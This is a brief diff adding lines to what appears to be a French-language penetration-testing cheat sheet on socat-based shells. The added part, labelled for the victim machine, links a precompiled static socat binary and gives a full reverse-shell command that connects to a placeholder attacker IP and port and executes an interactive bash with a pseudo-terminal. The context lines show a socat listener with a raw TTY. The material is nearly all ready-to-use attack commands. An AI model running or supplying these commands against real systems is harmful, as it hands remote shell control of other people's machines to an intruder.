@@ -41,3 +41,7 @@ socat TCP:<TARGET-IP>:<TARGET-PORT> -
 socat TCP-L:<port> FILE:`tty`,raw,echo=0
 ```
 
+[Victime] <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true">Socat précompilé</a>
+```
+socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
+```
